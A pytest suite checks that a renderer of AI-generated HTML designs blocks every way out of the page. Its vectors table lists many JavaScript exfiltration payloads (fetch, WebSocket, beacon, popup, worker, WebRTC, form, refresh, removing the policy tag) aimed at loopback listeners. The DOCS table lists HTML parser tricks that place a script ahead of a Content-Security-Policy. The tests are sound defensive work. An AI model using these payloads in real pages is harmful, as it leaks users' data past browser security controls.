"""Generated designs run with their scripts on, so they must not be able to send anything anywhere.

A design is HTML the model wrote (or the editor edited); the renderer used to block HTTP with a route on its one page,
which left WebSockets, windows the page opens, link prefetch, WebRTC and anything else that isn't an HTTP request on
that page. These tests aim a design at loopback listeners (HTTP, WebSocket, bare TCP, UDP) with a synthetic marker in
everything it sends, and require that nothing arrives, however it tries: fetch, XHR, beacons, WebSocket (in the page,
a worker and a window it opens), EventSource, frames, windows, forms, navigation, stylesheets, fonts, prefetch,
preconnect, workers, WebRTC. A browser with none of the layers hears all of it (the control, so the listeners are
known to work), and each layer alone is shown to hold its share, so taking one out is noticed.
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import re
import socket
import struct
import subprocess
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest
from conftest import GRAPHIC_HTML

from roughcut import graphics

needs_renderer = pytest.mark.skipif(graphics.renderer_problem() is not None, reason="no Playwright browser to render with")

MARKER = "ROUGHCUT-EXFIL-7f3a"


class Listeners:
    """Records whatever reaches a loopback HTTP server (WebSocket handshakes and frames included), a bare TCP connect, or a UDP port."""

    def __init__(self) -> None:
        self.hits: list[tuple[str, str]] = []
        self._lock = threading.Lock()
        outer = self

        class Handler(BaseHTTPRequestHandler):
            protocol_version = "HTTP/1.1"

            def log_message(self, *args):
                pass

            def setup(self):
                super().setup()
                outer.add("tcp", "connect")

            def _ok(self, ctype="text/html", body=b"<html><body>ok</body></html>"):
                self.send_response(200)
                self.send_header("content-type", ctype)
                self.send_header("content-length", str(len(body)))
                self.send_header("access-control-allow-origin", "*")
                self.end_headers()
                self.wfile.write(body)

            def do_GET(self):
                if self.headers.get("Upgrade", "").lower() == "websocket":
                    outer.add("ws", self.path)
                    key = self.headers["Sec-WebSocket-Key"] + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
                    accept = base64.b64encode(hashlib.sha1(key.encode()).digest()).decode()
                    self.wfile.write(f"HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: {accept}\r\n\r\n".encode())
                    self.wfile.flush()
                    try:
                        while True:
                            head = self.rfile.read(2)
                            if len(head) < 2:
                                break
                            size = head[1] & 0x7F
                            if size == 126:
                                size = struct.unpack(">H", self.rfile.read(2))[0]
                            mask = self.rfile.read(4) if head[1] & 0x80 else b""
                            data = bytearray(self.rfile.read(size))
                            for i in range(len(data)):
                                data[i] ^= mask[i % 4]
                            if head[0] & 0x0F == 8:
                                break
                            outer.add("ws-frame", data.decode("utf-8", "replace"))
                    except Exception:  # noqa: BLE001 - the browser hung up
                        pass
                    self.close_connection = True
                    return
                outer.add("http", f"GET {self.path}")
                self._ok("text/css", b"body{}") if "/css" in self.path else self._ok("text/event-stream", b"data: hi\n\n") if "/es" in self.path else self._ok()

            def do_POST(self):
                size = int(self.headers.get("content-length") or 0)
                outer.add("http", f"POST {self.path} {self.rfile.read(size).decode('utf-8', 'replace')[:80] if size else ''}")
                self._ok()

        self.http = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.http.daemon_threads = True
        self.port = self.http.server_address[1]
        threading.Thread(target=self.http.serve_forever, daemon=True).start()
        self.udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.udp.bind(("127.0.0.1", 0))
        self.udp.settimeout(0.2)
        self.udp_port = self.udp.getsockname()[1]
        self._closed = False
        threading.Thread(target=self._listen_udp, daemon=True).start()

    def _listen_udp(self) -> None:
        while not self._closed:
            try:
                data, _ = self.udp.recvfrom(4096)
                self.add("udp", f"{len(data)} bytes")
            except OSError:
                continue

    def add(self, kind: str, what: str) -> None:
        with self._lock:
            self.hits.append((kind, what))

    def reset(self) -> None:
        with self._lock:
            self.hits.clear()

    def heard(self) -> list[str]:
        with self._lock:
            return sorted({f"http:{w.split(' ')[1].split('?')[0]}" if k == "http" else f"ws:{w.split('?')[0]}" if k == "ws" else k for k, w in self.hits})

    def close(self) -> None:
        self._closed = True
        self.http.shutdown()
        self.udp.close()


@pytest.fixture(scope="module")
def listeners():
    found = Listeners()
    yield found
    found.close()


def vectors(port: int, udp: int) -> dict[str, str]:
    """One way of sending something out per entry: script that a design could run."""
    u, m = f"http://127.0.0.1:{port}", MARKER
    return {
        "websocket": f"const ws = new WebSocket('ws://127.0.0.1:{port}/ws?m={m}'); ws.onopen = () => ws.send('frame-{m}');",
        "fetch": f"fetch('{u}/fetch?m={m}').catch(() => {{}}); fetch('{u}/post', {{method: 'POST', body: '{m}', mode: 'no-cors'}}).catch(() => {{}});",
        "xhr": f"const x = new XMLHttpRequest(); x.open('GET', '{u}/xhr?m={m}'); x.send();",
        "beacon": f"navigator.sendBeacon('{u}/beacon?m={m}', '{m}')",
        "eventsource": f"new EventSource('{u}/es?m={m}')",
        "image": f"new Image().src = '{u}/img?m={m}'",
        "iframe": f"const f = document.createElement('iframe'); f.src = '{u}/frame?m={m}'; document.body.appendChild(f);",
        "iframe-srcdoc": f"const f = document.createElement('iframe'); f.srcdoc = '<script>fetch(\"{u}/srcdoc?m={m}\")<' + '/script>'; document.body.appendChild(f);",
        "popup": f"window.open('{u}/popup?m={m}')",
        "popup-write": f"const w = window.open('about:blank'); w.document.write('<img src=\"{u}/popupimg?m={m}\">')",
        "popup-websocket": f"const w = window.open('about:blank'); w.eval('new WebSocket(\"ws://127.0.0.1:{port}/popupws?m={m}\")')",
        "stylesheet": f"const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = '{u}/css?m={m}'; document.head.appendChild(l);",
        "css-import": f"const s = document.createElement('style'); s.textContent = '@import url({u}/cssimport?m={m});'; document.head.appendChild(s);",
        "css-background": f"const d = document.createElement('div'); d.style.cssText = 'width:5px;height:5px;background:url({u}/bg?m={m})'; document.body.appendChild(d);",
        "font": f"const s = document.createElement('style'); s.textContent = '@font-face{{font-family:X;src:url({u}/font?m={m})}} body{{font-family:X}}'; document.head.appendChild(s);",
        "preconnect": f"const l = document.createElement('link'); l.rel = 'preconnect'; l.href = '{u}'; document.head.appendChild(l);",
        "prefetch": f"const l = document.createElement('link'); l.rel = 'prefetch'; l.href = '{u}/prefetch?m={m}'; document.head.appendChild(l);",
        "preload": f"const l = document.createElement('link'); l.rel = 'preload'; l.as = 'fetch'; l.href = '{u}/preload?m={m}'; l.crossOrigin = ''; document.head.appendChild(l);",
        "script": f"const s = document.createElement('script'); s.src = '{u}/script?m={m}'; document.head.appendChild(s);",
        "module": f"import('{u}/module?m={m}').catch(() => {{}})",
        "media": f"new Audio('{u}/audio?m={m}').load(); const v = document.createElement('video'); v.src = '{u}/video?m={m}'; document.body.appendChild(v);",
        "object": f"const o = document.createElement('object'); o.data = '{u}/object?m={m}'; document.body.appendChild(o);",
        "ping": f"const a = document.createElement('a'); a.href = 'about:blank'; a.ping = '{u}/ping?m={m}'; document.body.appendChild(a); a.click();",
        "form": f"const f = document.createElement('form'); f.action = '{u}/form?m={m}'; f.method = 'POST'; document.body.appendChild(f); f.submit();",
        "navigate": f"location.href = '{u}/nav?m={m}'",
        "refresh": f"const t = document.createElement('meta'); t.httpEquiv = 'refresh'; t.content = '0;url={u}/refresh?m={m}'; document.head.appendChild(t);",
        "worker": f"new Worker(URL.createObjectURL(new Blob(['fetch(\"{u}/worker?m={m}\"); new WebSocket(\"ws://127.0.0.1:{port}/workerws?m={m}\")'], {{type: 'text/javascript'}})))",
        "service-worker": f"navigator.serviceWorker.register('{u}/sw.js').catch(() => {{}})",
        "webrtc": f"const pc = new RTCPeerConnection({{iceServers: [{{urls: 'stun:127.0.0.1:{udp}'}}]}}); pc.createDataChannel('x'); pc.createOffer().then(o => pc.setLocalDescription(o));",
        "webrtc-in-frame": f"const f = document.createElement('iframe'); document.body.appendChild(f); const pc = new f.contentWindow.RTCPeerConnection({{iceServers: [{{urls: 'stun:127.0.0.1:{udp}'}}]}}); pc.createDataChannel('x'); pc.createOffer().then(o => pc.setLocalDescription(o));",
        "by-name": f"fetch('http://localhost:{port}/byname?m={m}').catch(() => {{}}); new Image().src = 'http://localhost:{port}/bynameimg?m={m}';",
        "rewrite-document": f"document.open(); document.write('<script>fetch(\"{u}/rewrite?m={m}\")<' + '/script>'); document.close();",
        "remove-policy": f"document.querySelectorAll('meta[http-equiv]').forEach(t => t.remove()); fetch('{u}/removed?m={m}').catch(() => {{}});",
    }


def page_with(js: str) -> str:
    return f"<!doctype html><html><head><style>html,body{{margin:0}}</style></head><body><div>Plate</div><script>try {{ {js} }} catch (e) {{}}</script></body></html>"


def everything(listeners: Listeners, navigate: bool = True) -> str:
    """One design that tries every vector at once."""
    leave = ("navigate", "refresh", "form", "rewrite-document")  # these send the page away or wipe it: tried on their own
    names = [n for n in vectors(listeners.port, listeners.udp_port) if navigate or n not in leave]
    scripts = "\n".join(f"try {{ {vectors(listeners.port, listeners.udp_port)[n]} }} catch (e) {{}}" for n in names)
    return f"<!doctype html><html><head><style>html,body{{margin:0;background:transparent}}.p{{position:absolute;left:10%;top:40%;padding:8px;background:#c00;color:#fff;font:40px sans-serif}}</style></head><body><div class=p>Plate</div><script>{scripts}</script></body></html>"


# How a page is made for a vector: with every layer, or with one, or with none (the control).
ALL, CONTROL, POLICY_ONLY, CONTEXT_ONLY, BROWSER_ONLY = "all", "control", "policy only", "context only", "browser only"


async def _raw_browser(p):
    for kwargs in graphics._launch_options():
        try:
            return await p.chromium.launch(**kwargs)
        except Exception:  # noqa: BLE001
            continue
    raise AssertionError("no browser")


async def hear(listeners: Listeners, names: list[str], how: str, wait: float = 0.7) -> dict[str, list[str]]:
    from playwright.async_api import async_playwright

    found: dict[str, list[str]] = {}
    scripts = vectors(listeners.port, listeners.udp_port)
    async with async_playwright() as p:
        browser = await (graphics._launch_browser_async(p) if how in (ALL, BROWSER_ONLY) else _raw_browser(p))
        try:
            for name in names:
                listeners.reset()
                html = page_with(scripts[name])
                if how in (ALL, CONTEXT_ONLY):
                    page = await graphics._confined_page(browser, (320, 180, 1.0), [])
                else:
                    page = await (await browser.new_context(viewport={"width": 320, "height": 180})).new_page()
                if how in (ALL, POLICY_ONLY):
                    html = graphics.confine_html(html)
                try:
                    await page.set_content(html, wait_until="domcontentloaded", timeout=10_000)
                except Exception:  # noqa: BLE001 - a page that was sent away
                    pass
                await asyncio.sleep(wait)
                found[name] = listeners.heard()
                try:
                    await asyncio.wait_for(page.context.close(), 10)
                except Exception:  # noqa: BLE001
                    pass
        finally:
            await browser.close()
    return found


@pytest.fixture(scope="module")
def full_stack(listeners):
    return asyncio.run(hear(listeners, list(vectors(listeners.port, listeners.udp_port)), ALL))


@needs_renderer
def test_the_control_browser_hears_the_listeners(listeners):
    """A browser with none of the layers delivers each of these, so a silent listener below means something."""
    names = ["websocket", "fetch", "popup", "iframe", "webrtc", "worker", "by-name"]
    found = asyncio.run(hear(listeners, names, CONTROL))
    assert "ws:/ws" in found["websocket"] and "ws-frame" in found["websocket"]  # the marker, sent over the socket
    assert "http:/fetch" in found["fetch"] and "http:/post" in found["fetch"]
    assert "http:/popup" in found["popup"] and "http:/frame" in found["iframe"]
    assert "ws:/workerws" in found["worker"] and "http:/byname" in found["by-name"]
    if "udp" not in found["webrtc"]:  # a browser that sends no WebRTC to loopback can't show that the check below means anything
        pytest.skip("this browser sent no WebRTC UDP to the listener, so the WebRTC checks below prove nothing here")


@needs_renderer
@pytest.mark.parametrize("name", list(vectors(1, 1)))
def test_nothing_a_design_tries_gets_out(full_stack, name):
    assert full_stack[name] == [], f"{name} reached a listener: {full_stack[name]}"


@needs_renderer
def test_a_design_that_tries_everything_still_renders_and_says_what_it_tried(listeners, tmp_path):
    """Through the renderer itself (not the helpers): a design that tries every route out reaches nothing, the clip is made,
    and the notes name what it tried."""
    listeners.reset()
    job = {"id": "G01", "slug": "G01-test", "html": everything(listeners, navigate=False), "frames": 8, "fps": 30.0, "rate": "30/1",
           "canvas": graphics.canvas(320, 180), "out": str(tmp_path / "G01-test.mov"), "size": (320, 180)}
    result = graphics._render_one(job)
    time.sleep(1.0)
    assert listeners.heard() == [], listeners.hits
    assert result["error"] is None and (tmp_path / "G01-test.mov").exists()
    notes = " | ".join(result["notes"])
    assert f"tried to load ws://127.0.0.1:{listeners.port}/ws?m={MARKER} (blocked: designs must be self-contained)" in notes  # a WebSocket
    assert f"tried to load http://127.0.0.1:{listeners.port}/fetch?m={MARKER} (blocked" in notes  # a request
    assert f"tried to load http://127.0.0.1:{listeners.port}/popup?m={MARKER} (blocked" in notes or "tried to open another window" in notes  # a window
    assert "tried to open another window (closed: a design may only draw)" in notes


SEES_THE_POLICY = (
    "<!doctype html><html><head><style>html,body{margin:0;background:transparent}#p{position:absolute;left:0;top:0;width:100%;height:100%;background:#f00}</style></head>"
    "<body><div id=p></div><script>let refused = false; document.addEventListener('securitypolicyviolation', () => { refused = true; });"
    "try { fetch('http://127.0.0.1:9/x').catch(() => {}); } catch (e) {}"
    "window.seek = function (t) { document.getElementById('p').style.background = refused ? '#0f0' : '#f00'; };</script></body></html>"
)


@needs_renderer
def test_the_renderer_itself_puts_the_content_policy_on_the_page_it_renders(tmp_path):
    """Not a helper: the page `_render_one` makes. A design that paints itself green when the browser refuses one of its loads
    (the routes refusing it would leave it red) comes out green."""
    job = {"id": "G01", "slug": "G01-test", "html": SEES_THE_POLICY, "frames": 3, "fps": 30.0, "rate": "30/1",
           "canvas": graphics.canvas(320, 180), "out": str(tmp_path / "G01-test.mov"), "size": (320, 180)}
    assert graphics._render_one(job)["error"] is None
    rgb = subprocess.run(["ffmpeg", "-v", "error", "-i", str(tmp_path / "G01-test.mov"), "-frames:v", "1", "-vf", "scale=4:4,format=rgb24", "-f", "rawvideo", "-"],
                         capture_output=True, check=True).stdout
    r, g, b = rgb[0], rgb[1], rgb[2]
    assert g > 200 and r < 60 and b < 60, (r, g, b)


@needs_renderer
def test_a_design_that_navigates_its_page_away_is_left_out_and_says_so(listeners, tmp_path):
    listeners.reset()
    html = page_with(vectors(listeners.port, listeners.udp_port)["navigate"])
    job = {"id": "G01", "slug": "G01-test", "html": html, "frames": 30, "fps": 30.0, "rate": "30/1", "canvas": graphics.canvas(320, 180),
           "out": str(tmp_path / "G01-test.mov"), "size": (320, 180)}
    result = graphics._render_one(job)
    time.sleep(0.5)
    assert listeners.heard() == []
    assert result["error"] is None or "tried to navigate away" in result["error"]  # drawn before it left, or left out with the reason


@needs_renderer
def test_the_content_policy_alone_holds_most_of_it(listeners):
    """connect-src (data: and blob: only) and default-src 'none': every request a script or the markup can start from inside
    the page, workers and frames included, and the design can't lift it by removing its tag or rewriting its document."""
    names = ["websocket", "fetch", "xhr", "beacon", "eventsource", "image", "iframe-srcdoc", "popup-write", "stylesheet", "css-import",
             "css-background", "font", "prefetch", "preload", "script", "module", "media", "object", "ping", "worker", "webrtc",
             "rewrite-document", "remove-policy"]
    found = asyncio.run(hear(listeners, names, POLICY_ONLY))
    assert {n: h for n, h in found.items() if h and n != "webrtc"} == {}  # WebRTC's UDP isn't governed by it (the context removes it)
    # (a window the page opens isn't governed either: the context and the browser close that, below)


@needs_renderer
def test_the_context_alone_stops_requests_sockets_windows_and_webrtc(listeners):
    """No content policy and no dead proxy: the context's routes refuse HTTP (a window's too), the WebSocket route closes
    sockets (it only works when set up before the page exists), the stray window is closed and WebRTC isn't there."""
    names = ["websocket", "fetch", "xhr", "beacon", "image", "iframe-srcdoc", "popup", "popup-write", "popup-websocket", "stylesheet",
             "font", "script", "media", "webrtc", "webrtc-in-frame", "worker"]
    found = asyncio.run(hear(listeners, names, CONTEXT_ONLY))
    assert {n: [h for h in hits if h != "tcp"] for n, hits in found.items() if [h for h in hits if h != "tcp"]} == {}


@needs_renderer
def test_the_browser_alone_reaches_nothing_by_address_or_name(listeners):
    """No content policy, no routes, no offline: the browser itself has no way out. Every connection goes to a proxy that
    doesn't exist, and no name resolves, so even the ones nothing else sees (navigation, forms, preconnect, a name that
    would resolve to this computer) never connect."""
    names = ["websocket", "fetch", "popup", "iframe", "form", "navigate", "refresh", "preconnect", "prefetch", "worker", "by-name", "popup-websocket"]
    found = asyncio.run(hear(listeners, names, BROWSER_ONLY))
    assert {n: h for n, h in found.items() if h} == {}


# --------------------------------------------------------------- the policy goes in ahead of everything


DOCS = {
    "doctype": "<!doctype html><html><head></head><body>{x}</body></html>",
    "DOCTYPE upper": "<!DOCTYPE html>\n<html><head></head><body>{x}</body></html>",
    "leading whitespace": " \n\t<!doctype html><html><body>{x}</body></html>",
    "comment first": "<!-- made by a model --><!doctype html><html><body>{x}</body></html>",
    "empty comment trick": "<!--><script>{js}</script><!doctype html><html><body>{x}</body></html>-->",
    "comment hides head": "<!doctype html><!-- <head> --><html><head><script>{js}</script></head><body>{x}</body></html>",
    "no doctype": "<html><head></head><body>{x}</body></html>",
    "no head, script first": "<script>{js}</script><body>{x}</body>",
    "bare script": "<script>{js}</script>",
    "script in head": "<!doctype html><html><head><script>{js}</script></head><body></body></html>",
    # The parser takes these for comments before a doctype and stays in standards mode, so the policy goes after the doctype
    # here too (a <meta> ahead of it would have put the page in quirks mode and changed its layout).
    "xml prolog": '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE html><html><head></head><body>{x}</body></html>',
    "bogus comment": "<!x><!DOCTYPE html><html><body>{x}</body></html>",
    "bogus comment, one dash": "<!-x><!DOCTYPE html><html><body>{x}</body></html>",
    "cdata, bogus": "<![CDATA[ plain ]]><!doctype html><html><body>{x}</body></html>",
    "bogus end tag": "</3><!doctype html><html><body>{x}</body></html>",
    "empty end tag": "</><!doctype html><html><body>{x}</body></html>",
    "prolog, comment, space": '<?xml version="1.0"?> <!-- c --> \n<!doctype html><html><body>{x}</body></html>',
    # ...and these are not skipped: the first script runs ahead of the doctype, so the policy must be ahead of the script
    "script hidden in a bogus comment's tail": "<?x --><script>{js}</script><!doctype html><body>{x}</body>",
    "text before the doctype": "<![CDATA[ a > b ]]><!doctype html><html><body>{x}</body></html>",
    "unclosed prolog": "<?xml <script>{js}</script><!doctype html><body>{x}</body>",
}


@needs_renderer
@pytest.mark.parametrize("name", list(DOCS))
def test_the_policy_is_ahead_of_the_designs_first_script_and_leaves_its_layout_alone(listeners, name):
    from playwright.sync_api import sync_playwright

    js = f"fetch('http://127.0.0.1:{listeners.port}/first?m={MARKER}').catch(() => {{}});"
    html = DOCS[name].replace("{js}", js).replace("{x}", f"<script>{js}</script>")
    listeners.reset()
    with sync_playwright() as p:
        browser = None
        for kwargs in graphics._launch_options():
            try:
                browser = p.chromium.launch(**kwargs)
                break
            except Exception:  # noqa: BLE001
                continue
        mode = {}
        for label, text in (("plain", html), ("confined", graphics.confine_html(html))):
            page = browser.new_page()
            page.set_content(text, wait_until="domcontentloaded")
            mode[label] = page.evaluate("document.compatMode")
            if label == "plain":
                time.sleep(0.3)
                assert "http:/first" in listeners.heard(), "the control page sends nothing: the check below would mean nothing"
                listeners.reset()
            page.close()
        browser.close()
    time.sleep(0.4)
    assert listeners.heard() == []
    assert mode["plain"] == mode["confined"]  # standards or quirks mode is not changed by the policy being there


def test_confine_html_puts_the_policy_after_the_doctype_or_first():
    tag = graphics.CSP
    assert graphics.confine_html("<!doctype html><html></html>").startswith("<!doctype html><meta http-equiv=\"Content-Security-Policy\"")
    assert graphics.confine_html("<html></html>").startswith("<meta http-equiv=\"Content-Security-Policy\"")
    assert graphics.confine_html("<!-- c --><!DOCTYPE html><p>").index("<meta") == len("<!-- c --><!DOCTYPE html>")
    # a doctype hidden behind something that isn't a plain comment is not looked past
    assert graphics.confine_html("<!--><x><!doctype html>").startswith("<meta")
    assert tag in graphics.confine_html("x") and "connect-src data: blob:" in tag and "default-src 'none'" in tag


@pytest.mark.parametrize("before", ['<?xml version="1.0" encoding="UTF-8"?>\n', "<!x>", "<!-x >", "<![CDATA[ plain ]]>", "</3>", "</>", "  <?p?>\n<!-- c -->\t<!y>\n"])
def test_confine_html_looks_past_what_the_parser_takes_for_a_comment_before_a_doctype(before):
    html = before + "<!DOCTYPE html><p>x"
    assert graphics.confine_html(html).index("<meta") == len(before + "<!DOCTYPE html>")


@pytest.mark.parametrize("before", ["<?x --><script>1</script>", "<![CDATA[ a > b ]]>", "<?xml <script>1</script>", "</a>", "<!--", "<!-->", "x"])
def test_confine_html_puts_the_policy_first_when_something_else_comes_before_the_doctype(before):
    assert graphics.confine_html(before + "<!doctype html>").startswith("<meta")


def test_confine_html_is_quick_on_pathological_input():
    for junk in ("<?x>" * 80_000, "<!--" * 80_000, " \n" * 150_000, "<!x" * 100_000, "<?" + "a" * 300_000):
        t0 = time.monotonic()
        graphics.confine_html(junk + "<!doctype html>")
        assert time.monotonic() - t0 < 2.0


# --------------------------------------------------------------- what a normal design needs still works, pixel for pixel


FONT_AND_PICTURES = (
    "<!doctype html><html><head><style>html,body{margin:0;background:transparent}"
    "@keyframes slide{from{transform:translateX(-80px)}to{transform:none}}"
    ".a{position:absolute;left:20px;top:20px;font:700 44px Jost,sans-serif;color:#fff;background:#F26B21;padding:6px 14px;animation:slide .5s both}"
    ".b{position:absolute;left:20px;top:100px;width:60px;height:60px;background:url(\"data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='60' height='60'><circle cx='30' cy='30' r='26' fill='%2300a'/></svg>\")}"
    "</style></head><body><div class=a>Jost on data</div><div class=b></div>"
    "<svg width='320' height='60' style='position:absolute;left:0;top:200px'><rect y='10' height='30' width='0' fill='#0a0'><animate attributeName='width' from='0' to='300' dur='1s' fill='freeze'/></rect></svg>"
    "<canvas id=c width=60 height=60 style='position:absolute;left:240px;top:20px'></canvas>"
    "<img id=i style='position:absolute;left:240px;top:100px;width:40px'>"
    "<script>const c=document.getElementById('c').getContext('2d');c.fillStyle='#c0c';c.fillRect(0,0,60,60);"
    "document.getElementById('i').src=document.getElementById('c').toDataURL();"
    "const u=URL.createObjectURL(new Blob(['x']));window.blobUrl=u;"
    "window.seek=function(t){document.querySelector('.a').style.opacity=1-t/10}</script></body></html>"
)


async def _frames(how: str, html: str, times: list[float]) -> tuple[list[bytes], list[str]]:
    from playwright.async_api import async_playwright

    cw, ch, scale = graphics.canvas(320, 180)
    notes: list[str] = []
    shots = []
    async with async_playwright() as p:
        browser = await (graphics._launch_browser_async(p) if how == "confined" else _raw_browser(p))
        if how == "confined":
            page = await graphics._confined_page(browser, (cw, ch, scale), notes)
            page.on("console", lambda m: graphics._console(notes, m))
            page.on("pageerror", lambda e: graphics._note(notes, f"script error: {e}"))
            html = graphics.confine_html(graphics.brand_fonts.embed(html))
        else:
            page = await (await browser.new_context(viewport={"width": cw, "height": ch}, device_scale_factor=scale)).new_page()
            html = graphics.brand_fonts.embed(html)
        cdp = await page.context.new_cdp_session(page)
        await cdp.send("Emulation.setDefaultBackgroundColorOverride", {"color": {"r": 0, "g": 0, "b": 0, "a": 0}})
        await page.set_content(html, wait_until="load")
        await graphics.load_fonts(page)
        world = await graphics.drawing_world(cdp, "start")
        for t in times:
            await graphics._evaluate(cdp, f"({graphics._SEEK_JS})({t!r})", 5, "seek")
            shots.append(await graphics._frame_png(page, cdp, world, (cw, ch, scale), True, "frame"))
        await browser.close()
    return shots, notes


@needs_renderer
def test_a_normal_design_draws_the_same_pixels_with_every_layer_on():
    """Brand fonts embedded as data, a data: picture, SVG animation, a canvas, a blob URL, CSS animation and a seek hook:
    each frame is byte for byte what a browser with none of the layers draws, and nothing is noted."""
    times = [0.0, 0.2, 0.5, 1.0, 1.5]
    plain, _ = asyncio.run(_frames("control", FONT_AND_PICTURES, times))
    confined, notes = asyncio.run(_frames("confined", FONT_AND_PICTURES, times))
    assert [i for i, (a, b) in enumerate(zip(plain, confined)) if a != b] == []
    assert len(set(plain)) > 1  # and it does animate
    assert notes == []


# --------------------------------------------------------------- the context is built the way the notes say


class _Context:
    def __init__(self, calls):
        self.calls = calls

    async def add_init_script(self, script):
        self.calls.append(("init_script", "RTCPeerConnection" in script))

    async def route_web_socket(self, pattern, handler):
        self.calls.append(("route_web_socket", None))

    async def route(self, pattern, handler):
        self.calls.append(("route", pattern))

    async def new_page(self):
        self.calls.append(("new_page", None))
        return object()

    def on(self, event, handler):
        self.calls.append(("on", event))


class _Browser:
    def __init__(self):
        self.calls = []

    async def new_context(self, **options):
        self.calls.append(("new_context", options))
        return _Context(self.calls)


def test_the_context_is_offline_blocks_service_workers_and_downloads_and_wraps_websockets_before_the_page():
    browser = _Browser()
    asyncio.run(graphics._confined_page(browser, (640, 360, 1.0), []))
    names = [c[0] for c in browser.calls]
    options = browser.calls[0][1]
    assert options["service_workers"] == "block" and options["offline"] is True and options["accept_downloads"] is False
    assert options["viewport"] == {"width": 640, "height": 360} and options["device_scale_factor"] == 1.0
    assert ("init_script", True) in browser.calls  # WebRTC removed
    # Playwright wraps window.WebSocket in a script it injects, so the route has to be there before the page is made
    assert names.index("route_web_socket") < names.index("new_page") and names.index("route") < names.index("new_page")
    # and the closer of stray windows listens only once the design's page exists (it must not close its own page)
    assert names.index("new_page") < names.index("on")


# --------------------------------------------------------------- the sandbox is tried once per process


class _FakePage:
    def __init__(self, ok=True):
        self.ok = ok

    def wait_for_function(self, js, timeout=None):
        if not self.ok:
            raise RuntimeError("the renderer crashed")
        return True

    def close(self):
        pass


class _FakeBrowser:
    def __init__(self, sandbox):
        self.sandbox, self.closed = sandbox, False

    def new_page(self):
        return _FakePage()

    def close(self):
        self.closed = True


class _FakeChromium:
    def __init__(self, sandbox_works=True, installed=True):
        self.sandbox_works, self.installed, self.launches = sandbox_works, installed, []

    def launch(self, **options):
        self.launches.append(options)
        if not self.installed:
            raise RuntimeError("BrowserType.launch: Executable doesn't exist at /nowhere/chrome")
        if options["chromium_sandbox"] and not self.sandbox_works:
            raise RuntimeError("BrowserType.launch: Target page, context or browser has been closed")
        return _FakeBrowser(options["chromium_sandbox"])


class _FakePlaywright:
    def __init__(self, **kw):
        self.chromium = _FakeChromium(**kw)


@pytest.fixture
def fresh_sandbox(monkeypatch, capsys):
    monkeypatch.setattr(graphics, "SANDBOX", graphics._Sandbox())
    return capsys


def test_a_computer_that_cant_sandbox_chromium_is_told_once_and_launches_without_it_from_then_on(fresh_sandbox):
    p = _FakePlaywright(sandbox_works=False)
    first = graphics.launch_browser(p)
    assert first.sandbox is False and graphics.SANDBOX.on is False
    assert [o["chromium_sandbox"] for o in p.chromium.launches] == [True, False]  # tried it, then the same browser without
    assert p.chromium.launches[0]["timeout"] == graphics.SANDBOX_LAUNCH_SECONDS * 1000  # the first try can't hang
    said = fresh_sandbox.readouterr().err
    assert said.count("Chromium's sandbox can't start here") == 1 and "Target page, context or browser has been closed" in said
    for _ in range(3):
        assert graphics.launch_browser(p).sandbox is False
    assert [o["chromium_sandbox"] for o in p.chromium.launches[2:]] == [False, False, False]  # decided once: no more tries
    assert "sandbox" not in fresh_sandbox.readouterr().err  # and nothing more said


def test_a_computer_that_can_sandbox_chromium_keeps_it_on(fresh_sandbox):
    p = _FakePlaywright(sandbox_works=True)
    assert graphics.launch_browser(p).sandbox is True and graphics.SANDBOX.on is True
    assert graphics.launch_browser(p).sandbox is True
    assert all(o["chromium_sandbox"] for o in p.chromium.launches) and "timeout" in p.chromium.launches[0] and "timeout" not in p.chromium.launches[1]
    assert "sandbox" not in fresh_sandbox.readouterr().err


def test_a_sandboxed_browser_that_cant_draw_a_page_is_not_trusted(fresh_sandbox, monkeypatch):
    class Crashes(_FakeBrowser):
        def new_page(self):
            return _FakePage(ok=not self.sandbox)

    class Chromium(_FakeChromium):
        def launch(self, **options):
            self.launches.append(options)
            return Crashes(options["chromium_sandbox"])

    p = _FakePlaywright()
    p.chromium = Chromium()
    assert graphics.launch_browser(p).sandbox is False and graphics.SANDBOX.on is False


def test_a_sandbox_that_worked_and_then_doesnt_start_says_so_and_the_browser_still_launches(fresh_sandbox):
    p = _FakePlaywright(sandbox_works=True)
    graphics.launch_browser(p)
    assert graphics.SANDBOX.on is True
    p.chromium.sandbox_works = False  # this time it can't
    assert graphics.launch_browser(p).sandbox is False
    assert graphics.SANDBOX.on is True  # the process-wide choice stands
    assert "didn't start this time" in fresh_sandbox.readouterr().err


def test_no_browser_installed_does_not_decide_the_sandbox(fresh_sandbox):
    p = _FakePlaywright(installed=False)
    with pytest.raises(graphics.GraphicsError, match="No browser"):
        graphics.launch_browser(p)
    assert graphics.SANDBOX.on is None  # nothing was learned about the sandbox
    assert [o["chromium_sandbox"] for o in p.chromium.launches][:1] == [True]
    assert len(p.chromium.launches) == len(list(graphics._launch_options()))  # "doesn't exist" isn't tried twice


def test_browsers_launched_together_settle_the_sandbox_once(fresh_sandbox):
    p = _FakePlaywright(sandbox_works=False)
    results = []
    threads = [threading.Thread(target=lambda: results.append(graphics.launch_browser(p).sandbox)) for _ in range(6)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    assert results == [False] * 6 and graphics.SANDBOX.on is False
    assert fresh_sandbox.readouterr().err.count("Chromium's sandbox can't start here") == 1


def test_every_launch_goes_through_a_proxy_that_doesnt_exist_and_resolves_no_names(fresh_sandbox):
    p = _FakePlaywright()
    graphics.launch_browser(p)
    options = p.chromium.launches[0]
    assert options["proxy"] == {"server": graphics.DEAD_PROXY, "bypass": "<-loopback>"}  # loopback included
    assert "--host-resolver-rules=MAP * ~NOTFOUND" in options["args"]


@needs_renderer
def test_the_real_browser_settles_the_sandbox_once_and_still_renders(tmp_path, capsys, monkeypatch):
    """Whatever this computer allows (as root in a container Chromium can't sandbox itself; on a Mac it can), the choice is made
    by the first launch, said once if it is 'off', and a render goes through either way."""
    monkeypatch.setattr(graphics, "SANDBOX", graphics._Sandbox())
